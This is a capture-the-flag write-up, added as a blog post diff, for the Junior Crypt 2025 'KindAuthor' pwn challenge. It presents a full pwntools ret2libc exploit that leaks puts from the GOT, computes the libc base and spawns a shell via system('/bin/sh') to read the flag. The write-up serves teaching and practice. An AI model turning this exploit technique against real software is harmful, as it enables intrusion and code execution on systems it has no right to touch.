@@ -1,0 +1,319 @@
+---
+title: Junior Crypt 2025 - Pwn - KindAuthor
+date: '2025-07-03'
+tags: ['CTF', 'PWN', 'gdb', 'Overflow', 'Libc', 'Pwntools', 'Linux']
+draft: false
+summary: A detailed write-up of the `ret2libc` exploit technique, including its application in Capture The Flag (CTF) challenges.
+---
+
+## Table of Contents
+
+* [Challenge Description](#challenge-description)
+* [Files Provided](#-files-provided)
+* [Challenge Overview](#challenge-overview)
+* [Step 1: Analyzing the Binary](#step-1-analyzing-the-binary)
+* [Step 2: Finding Overflow Offset](#step-2-finding-overflow-offset)
+* [Step 3: Preparing ROP Gadgets](#step-3-preparing-rop-gadgets)
+* [Step 4: Leaking libc Address](#step-4-leaking-libc-address)
+* [Step 5: Calculating libc Base](#step-5-calculating-libc-base)
+* [Step 6: Crafting Final ret2libc Payload](#step-6-crafting-final-ret2libc-payload)
+* [Step 7: Exploitation and Flag](#step-7-exploitation-and-flag)
+* [Conclusion](#conclusion)
+
+---
+
+## Challenge Description
+There was a very kind author living in the digital world. He
+created a unique helper programme that was supposed to
+make life easier for other developers. In his boundless
+kindness, he even built into the programme a special function
+that he thought would help debug complex call chains. 'Let the
+user have all the tools at his fingertips!' - he liked to say,
+without thinking about the consequences. But kindness
+sometimes borders on naivety. The author trusted his users so
+much that he completely forgot about basic safety rules. He
+left the door to his house wide open, hanging a sign on it saying
+'Welcome'
+
+##  Files Provided:
+
+- `KindAuthor` (binary)  
+- `libc.so.6`  
+- `ld-linux-x86-64.so.2`  
+
+---
+
+## Challenge Overview
+
+The challenge is a 64-bit ELF binary with the following properties:
+
+```text
+Partial RELRO | No Canary | NX Enabled | No PIE | Not stripped
+````
+
+The binary prompts:
+
+```
+Hello
+Input your data:
+```
+
+Testing with large input causes a **segmentation fault**, indicating a **buffer overflow** vulnerability.
+
+![Segmentation Fault](/static/images/JuniorCrypt/segfault.png)
+
+---
+
+## Step 1: Analyzing the Binary
+
+Using `checksec`:
+
+```bash
+checksec --file=KindAuthor
+```
+
+![Checksec Results](/static/images/JuniorCrypt/checksec.png)
+
+
+**Results:**
+
+- **NX enabled** → cannot execute shellcode on stack
+- **No PIE** → static addresses possible
+- **No stack canary** → buffer overflow possible
+
+The `func()` function reads user input:
+
+```c
+void func(void)
+{
+  undefined local_28[32]; // 32-byte buffer
+  read(0, local_28, 0x80);
+  return;
+}
+```
+
+
+> This confirms that we can overflow the `32`-byte buffer since `read` allows `128` bytes.
+
+        ![Binary Analysis Screenshot](/static/images/JuniorCrypt/decompiled_func.png)
+
+---
+
+## Step 2: Finding Overflow Offset
+
+We used PwnTools `cyclic` pattern:
+
+```gdb
+cyclic 100
+```
+
+    ![Overflow Offset](/static/images/JuniorCrypt/cyclic1.png)
+
+GDB revealed:
+
+```text
+RSP overwritten with: 0x6161616161616166 ('faaaaaaa')
+Offset to RIP: 40 bytes
+```
+
+    ![Overflow Offset](/static/images/JuniorCrypt/cyclic2.png)
+
+
+**Payload Layout:**
+
+```
+[Buffer `32` bytes + Padding `8` bytes][RIP overwrite][ROP chain]
+```
+
+---
+
+## Step 3: Preparing ROP Gadgets
+
+
+We need a **`pop rdi; ret` gadget** to control the first argument (`RDI`) for function calls on `x86_64`:
+
+    - I used ROPgadget to find the gadget:
+
+```bash
+ROPgadget --binary KindAuthor | grep "pop rdi"
+```
+
+    ![Pop RDI Gadget](/static/images/JuniorCrypt/pop_rdi.png)
+
+```python
+pop_rdi = 0x000000000040114a
+```
+
+
+* This will pop out anything in `RDI` and allow us to control the first argument of any function we call.
+* We can pass the address of `puts` for leaking `libc`.
+
+---
+
+## Step 4: Leaking libc Address
+
+
+To compute `libc` base, we leak `puts` address from the `GOT`:
+
+```python
+from pwn import *
+
+elf = context.binary = ELF('./KindAuthor')
+io = process()
+
+
+puts = elf.got.puts # `GOT` entry for `puts`
+main = elf.sym.main # Entry point for `main`
+
+payload = cyclic(40) 
+payload += pack(pop_rdi)
+payload += pack(puts)
+payload += pack(elf.sym.puts)
+payload += pack(main)
+
+io.sendlineafter('Input your data:\n', payload)
+
+leaked = io.recvline().strip()
+leaked_addr = u64(leaked.ljust(8, b'\x00'))
+log.success(f"Leaked `puts@libc`: {hex(leaked_addr)}")
+```
+
+![Puts Leak](/static/images/JuniorCrypt/leaked_puts.png)
+
+---
+
+## Step 5: Calculating libc Base
+
+
+Using offsets from `libc.so.6`:
+
+```bash
+objdump -T libc.so.6 | grep puts
+```
+
+![Puts Libc](/static/images/JuniorCrypt/puts_libc.png)
+
+```bash
+strings -t x libc.so.6 | grep "/bin/sh"
+```
+
+![Bin Sh Libc](/static/images/JuniorCrypt/binsh_libc.png)
+
+```bash
+objdump -T libc.so.6 | grep system
+```
+
+![Puts Libc](/static/images/JuniorCrypt/system_libc.png)
+
+
+    - A `ret` gadget for stack alignment:
+
+```bash
+ROPgadget --binary KindAuthor | grep "ret"
+```
+
+![Ret Gadget](/static/images/JuniorCrypt/ret_ROP.png)
+
+
+    - So we can calculate the `libc` base from known offsets and then use it to find the addresses of `system` and `/bin/sh`:
+
+```python
+libc_base = leaked_addr - 0x805a0      # puts offset
+bin_sh    = libc_base + 0x1a7ea4       # /bin/sh string offset
+system    = libc_base + 0x53110        # system() offset
+ret       = 0x401016                   # ret gadget for alignment
+```
+
+---
+
+## Step 6: Crafting Final ret2libc Payload
+
+```python
+
+payload = cyclic(40) # Overflow 
+payload += pack(pop_rdi) # Control `RDI`
+payload += pack(bin_sh) # Set `RDI` to "/bin/sh"
+payload += pack(ret) # Align stack
+payload += pack(system) # Call `system("/bin/sh")`
+
+io.sendlineafter('Input your data:\n', payload)
+print("Got the shell! Reading flag...") # Out of excitement lol
+io.interactive()
+```
+
+---
+
+## Step 7: Exploitation and Flag
+
+
+Our complete final payload is:
+
+```python
+from pwn import *
+
+elf = context.binary = ELF('./KindAuthor')
+io = process()
+
+
+pop_rdi = 0x000000000040114a
+puts = elf.got.puts
+main = elf.sym.main
+
+payload = cyclic(40)
+payload += pack(pop_rdi)
+payload += pack(puts)
+payload += pack(elf.sym.puts)
+payload += pack(main)
+
+io.sendlineafter('Input your data:\n', payload)
+
+leaked = io.recvline().strip()
+leaked_addr = u64(leaked.ljust(8, b'\x00'))
+log.success(f"Leaked `puts@libc`: {hex(leaked_addr)}")
+
+
+libc_base = leaked_addr - 0x805a0      # `puts` offset
+bin_sh    = libc_base + 0x1a7ea4       # `/bin/sh` string offset
+system    = libc_base + 0x53110        # `system()` offset
+ret       = 0x401016                   # `ret` gadget for alignment
+
+
+payload = cyclic(40)
+payload += pack(pop_rdi)
+payload += pack(bin_sh)
+payload += pack(ret)
+payload += pack(system)
+
+io.sendlineafter('Input your data:\n', payload)
+print("Got the shell! Reading flag...")
+io.interactive()
+```
+
+![Script Run](/static/images/JuniorCrypt/script_run.png)
+
+```bash
+$ cat flag.txt
+grodno {bL491M1_N4M3R3n1Y4m1_VYm05ch3n4_d0R094_v_5h31L}
+```
+
+---
+
+## Conclusion
+
+
+* The challenge used a **classic buffer overflow** with **`ret2libc` exploitation**.
+* **No PIE**, **NX enabled**, and **no canary** made it straightforward.
+* **Step-by-step approach:**
+
+
+    1. **Identify overflow**
+    2. **Determine offset**
+    3. **Leak libc address**
+    4. **Calculate libc base**
+    5. **Build final ROP chain**
+    6. **Spawn shell and read flag**
+
+
+> This writeup demonstrates a clean **beginner-friendly `ret2libc` exploitation workflow**.
+
+---
